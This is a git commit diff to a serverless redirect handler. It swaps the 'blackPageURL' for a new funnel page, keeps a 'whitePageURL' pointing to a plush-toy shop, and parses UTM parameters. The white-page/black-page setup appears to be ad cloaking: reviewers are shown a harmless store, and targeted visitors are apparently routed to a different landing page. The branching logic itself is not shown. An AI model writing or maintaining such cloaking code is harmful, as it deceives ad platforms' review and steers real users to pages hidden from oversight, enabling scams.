3e72981ca758596765d03c53a239df204a5350ca
Ayden Xu <aydenxunc@gmail.com>
2025-03-20 22:36:14 -0400

    sdfls

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://gloomybearstore.com/collections/plushies";
-    const blackPageURL = "https://rwrds.live";
+    const blackPageURL = "https://SiImUqRhJu.myfunnelish.com/shwards";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
